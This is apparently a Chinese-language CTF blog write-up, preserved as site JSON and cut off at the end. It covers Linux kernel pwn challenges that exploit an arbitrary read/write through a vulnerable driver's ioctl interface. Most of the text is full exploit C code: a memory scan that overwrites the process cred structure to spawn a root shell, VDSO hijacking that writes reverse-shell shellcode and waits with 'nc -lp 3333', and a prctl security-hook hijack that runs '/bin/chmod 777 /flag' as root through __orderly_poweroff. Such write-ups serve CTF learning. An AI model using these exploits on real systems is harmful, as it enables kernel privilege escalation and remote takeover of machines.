|           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|    64T                |           | direct mapping of all phys. memory            |+++++++++++++|                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|                       |           |                                               |+++++++++++++|    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|                       |           |                                               |+++++++++++++|0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+                       |-----------|                                               |-------------|                       |-----------| hole caused by [48:63] sign extension         |-------------|                       |-----------|                                               |-------------|0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|                       |           |                                               |  user space |                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|    128T               |           | different per mm                              |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+\n\n在0xffff880000000000——0xffffc80000000000区域，是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。\n综上，exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tloff_t index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;int main()&#123;\tint fd = -1;\tint result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffff880000000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tint root_cred[12];\t// set target in task_struct\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tprctl(PR_SET_NAME, target);\tfd = open(&quot;/dev/csaw&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffc80000000000; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tresult = memmem(buf, 0x1000, target, 16);\t\t// printf(&quot;0x%lx&quot;,addr);\t\tif (result)\t\t&#123;\t\t\tcred = *(size_t *)(result - 0x8);\t\t\treal_cred = *(size_t *)(result - 0x10);\t\t\tif ((cred || 0xff00000000000000) &amp;&amp; (real_cred == cred))\t\t\t&#123;\t\t\t\t// printf(&quot;[]%lx[]&quot;,result-(int)(buf));\t\t\t\ttarget_addr = addr + result - (int)(buf);\t\t\t\tprintf(&quot;[+]found task_struct 0x%lx\\n&quot;, target_addr);\t\t\t\tprintf(&quot;[+]found cred 0x%lx\\n&quot;, real_cred);\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tfor (int i = 0; i &lt; 44; i++)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = cred - 0x10 + 4 + i;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\troot_cred[0] = 0;\t\twrite_args.id = alloc_args.id;\t\twrite_args.buf = (char *)root_cred;\t\twrite_args.count = 1;\t\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\t&#125;\tif (getuid() == 0)\t&#123;\t\tprintf(&quot;[+]now you are r00t,enjoy ur shell\\n&quot;);\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse\t&#123;\t\tputs(&quot;[-] there must be something error ... &quot;);\t\texit(-1);\t&#125;\treturn 0;&#125;\n\n劫持VDSOVDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。\nvdso里的函数主要有五个\nclock_gettime\t0000000000000A10\tgettimeofday\t0000000000000C80\ttime\t0000000000000DE0\tgetcpu\t0000000000000E00\tstart\t0000000000000940\n\nVDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的\n利用方式首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。\n其次，等待某root权限的进程调用这个函数就可以利用反弹shell完成提权。\n根据上面的内存映射图，再结合vdso在内核附近，我们可以确定vdso范围0xffffffff80000000——0xffffffffffffefff\n所以思路很明显，在内核中修改函数地址为shellcode就可，所以现在就是怎么找到函数地址\n首先，获得其中gettimeofday字符串到vdso的其实位置的偏移\nint get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\terrExit(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\terrExit(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;\n\n随后在内存映射图中获取的位置进行爆破\nfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)&#123;    seek_args.id = alloc_args.id;    seek_args.index = addr - 0x10;    seek_args.whence = SEEK_SET;    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);    read_args.id = alloc_args.id;    read_args.buf = buf;    read_args.count = 0x1000;    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);    if ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))    &#123;        result = addr;        printf(&quot;[+] found vdso %lx\\n&quot;, result);        break;    &#125;&#125;\n\n这里是一页一页的搜索并且由于我们知道字符串的偏移，所以我们可以直接进行对比，所以效率还是十分高效的\n接下来就是思考在什么地方写入shellcode了，我们目前是不知道函数的执行代码在哪里，我们可以使用下面的方法拿到vdso.so文件放进ida分析\n\n\n\n可以看到gettimeofday函数的代码段是在偏移为0xc80的地方，所以我们覆盖这里为shellcode即可。\n为什么从一开始就一直说这个gettimeofday函数呢？\n上面说了这一攻击方式需要有一个有root权限的程序去执行这里面的函数，所以我们就需要一个不停的调用vdso内函数的一个程序。\n在真实环境下crontab会不停的调用搞gettimeofday函数，但是题目是qemu的模拟环境所以没有这个程序，但是题目有一个模拟的程序\n#include &lt;stdio.h&gt;int main()&#123;\twhile(1)&#123;\t\tputs(&quot;111&quot;);\t\tsleep(1);\t\tgettimeofday();\t&#125;&#125;\n\n最后综上，得出exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tint root_cred[12];\tint offset;\tchar shellcode[] = &quot;\\x90\\x53\\x48\\x31\\xC0\\xB0\\x66\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xC3\\x75\\x0F\\x48\\x31\\xC0\\xB0\\x39\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x09\\x5B\\x48\\x31\\xC0\\xB0\\x60\\x0F\\x05\\xC3\\x48\\x31\\xD2\\x6A\\x01\\x5E\\x6A\\x02\\x5F\\x6A\\x29\\x58\\x0F\\x05\\x48\\x97\\x50\\x48\\xB9\\xFD\\xFF\\xF2\\xFA\\x80\\xFF\\xFF\\xFE\\x48\\xF7\\xD1\\x51\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x2A\\x58\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x07\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\\x90\\x6A\\x03\\x5E\\x6A\\x21\\x58\\x48\\xFF\\xCE\\x0F\\x05\\x75\\xF6\\x48\\x31\\xC0\\x50\\x48\\xBB\\xD0\\x9D\\x96\\x91\\xD0\\x8C\\x97\\xFF\\x48\\xF7\\xD3\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\\x05\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05&quot;;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tprctl(PR_SET_NAME, target);\tfd = open(&quot;/dev/csaw&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tseek_args.id = alloc_args.id;\tseek_args.index = result - 0x10 + 0xc80;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = shellcode;\twrite_args.count = strlen(shellcode);\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tif (check_vsdo_shellcode(shellcode) != 0)\t&#123;\t\tputs(&quot;[+] shellcode is written into vdso, waiting for a reverse shell :&quot;);\t\tif (fork() == 0)\t\t&#123;\t\t\tprintf(&quot;gettimeofday\\n&quot;);\t\t\tsleep(1);\t\t\tvoid (*gettimeofday_addr)();\t\t\tgettimeofday_addr = 0xc80 + getauxval(AT_SYSINFO_EHDR);\t\t\tgettimeofday_addr();\t\t\texit(-1);\t\t&#125;\t\tsystem(&quot;nc -lp 3333&quot;);\t&#125;\telse\t&#123;\t\tputs(&quot;[-] someting wrong ... &quot;);\t\texit(-1);\t&#125;\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\treturn 0;&#125;\n\nexp使用的shellcode为：https://gist.github.com/itsZN/1ab36391d1849f15b785\n\n参考链接：http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO\n","categories":["kernel-pwn"],"tags":["修改cred，劫持vdso"]},{"title":"kernel pwn内存任意读写提升权限[2]","url":"/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/","content":"这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样\ncase 0x77617369:    if ( copy_from_user(&amp;v27, a3, 24LL) )        return -22LL;    v5 = v3 + 1;    mutex_lock(v3 + 1);    v16 = *v3;    v7 = v29;    if ( !*v3 )        goto LABEL_39;    v17 = *((_QWORD *)v16 + 3);    if ( (unsigned __int64)(v17 + v29) &gt; *((_QWORD *)v16 + 2) )        goto LABEL_25;    v18 = *((_QWORD *)v16 + 1) + v17;    if ( v18 &lt;= 0xFFFFFFFF7FFFFFFFLL )    &#123;        printk(&amp;unk_779, v28);    &#125;    else if ( strncpy_from_user(v18, v28, v29) &gt;= 0 )    &#123;        goto LABEL_19;    &#125;    goto LABEL_25;\n\n但是在写内容的这个地方和那一道题有些许不同，这里禁止往0xFFFFFFFF80000000之前的地址写入了，这也就导致昨天的两种利用方式无法使用了。\n原理分析Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。\nSYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,                unsigned long, arg4, unsigned long, arg5)&#123;    struct task_struct *me = current;    unsigned char comm[sizeof(me-&gt;comm)];    long error;    error = security_task_prctl(option, arg2, arg3, arg4, arg5);    if (error != -ENOSYS)        return error;    ...\n\nprctl源码中调用了security_task_prctl函数\nint security_task_prctl(int option, unsigned long arg2, unsigned long arg3,                        unsigned long arg4, unsigned long arg5)&#123;    int thisrc;    int rc = -ENOSYS;    struct security_hook_list *hp;    list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) &#123;        thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);        if (thisrc != -ENOSYS) &#123;            rc = thisrc;            if (thisrc != 0)                break;        &#125;    &#125;    return rc;&#125;\n\n函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。\n提一下call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。\nint call_usermodehelper(char *path, char **argv, char **envp, int wait)&#123;\tstruct subprocess_info *info;\tgfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;\tinfo = call_usermodehelper_setup(path, argv, envp, gfp_mask,\t\t\t\t\t NULL, NULL, NULL);\tif (info == NULL)\t\treturn -ENOMEM;\treturn call_usermodehelper_exec(info, wait);&#125;\n\n查看引用发现mce_do_trigger函数有调用call_usermodehelper并且第一个参数为全局变量\nstatic void mce_do_trigger(struct work_struct *work)&#123;\tcall_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);&#125;\n\n但是需要改的东西比较多，所以寻找更好的gadget\nstatic int run_cmd(const char *cmd)&#123;\tchar **argv;\tstatic char *envp[] = &#123;\t\t&quot;HOME=/&quot;,\t\t&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;,\t\tNULL\t&#125;;\tint ret;\targv = argv_split(GFP_KERNEL, cmd, NULL);\tif (argv) &#123;\t\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\t\targv_free(argv);\t&#125; else &#123;\t\tret = -ENOMEM;\t&#125;\treturn ret;&#125;static int __orderly_reboot(void)&#123;\tint ret;\tret = run_cmd(reboot_cmd);\tif (ret) &#123;\t\tpr_warn(&quot;Failed to start orderly reboot: forcing the issue\\n&quot;);\t\temergency_sync();\t\tkernel_restart(NULL);\t&#125;\treturn ret;&#125;static int __orderly_poweroff(bool force)&#123;\tint ret;\tret = run_cmd(poweroff_cmd);\tif (ret &amp;&amp; force) &#123;\t\tpr_warn(&quot;Failed to start orderly shutdown: forcing the issue\\n&quot;);\t\t/*\t\t * I guess this should try to kick off some daemon to sync and\t\t * poweroff asap.  Or not even bother syncing if we&#x27;re doing an\t\t * emergency shutdown?\t\t */\t\temergency_sync();\t\tkernel_power_off();\t&#125;\treturn ret;&#125;\n\n可以看到这里的run_cmd是会调用call_usermodehelper，我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。为了实现上述目标，我们首先需要得到内核基址，在上一篇也提到了怎么计算出vdso地址，我们有了vdso地址也可以得出内核基地址了。\n综上可得出exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tsize_t kernel_base = 0;\tsize_t selinux_disable_addr = 0x2C7BA0;\tsize_t prctl_hook = 0x124FD00;\tsize_t order_cmd = 0x123D1E0;\tsize_t poweroff_work_func_addr = 0x9C4C0;\tint root_cred[12];\tint offset;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tfd = open(&quot;/proc/simp1e&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tkernel_base = addr - 0x1020000;\tprctl_hook += kernel_base;\torder_cmd += kernel_base;\tpoweroff_work_func_addr += kernel_base;\tprintf(&quot;[+] found kernel base: %lx\\n&quot;, kernel_base);\tprintf(&quot;[+] found prctl_hook: %lx\\n&quot;, prctl_hook);\tprintf(&quot;[+] found order_cmd : %lx\\n&quot;, order_cmd);\tprintf(&quot;[+] found poweroff_work_func_addr: %lx\\n&quot;, poweroff_work_func_addr);\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tstrcpy(buf, &quot;/bin/chmod 777 /flag\\0&quot;);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = strlen(buf) + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd + 20 - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\t*(size_t *)buf = poweroff_work_func_addr;\tseek_args.id = alloc_args.id;\tseek_args.index = prctl_hook - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 20 + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tprctl(addr, 2, addr, addr, 2);\treturn 0;&#125;\n\n以上程序的效果是修改权限，当然也是可以反弹shell的，不过需要再写一个程序并且上面的exp也需要修改一下\n#include &lt;stdio.h&gt;#include 